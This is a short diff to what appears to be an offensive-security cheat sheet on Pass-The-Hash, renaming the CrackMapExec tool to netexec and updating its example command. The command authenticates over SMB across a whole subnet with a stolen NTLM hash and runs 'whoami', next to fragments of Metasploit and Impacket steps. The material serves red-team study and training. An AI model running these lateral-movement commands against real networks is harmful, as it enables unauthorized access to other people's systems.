@@ -14,9 +14,9 @@ The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since 
   run
   shell
   ```
-* CrackMapExec
+* netexec
   ```powershell
-  cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
+  nxc smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
   ```
 * Impacket suite
   ```powershell
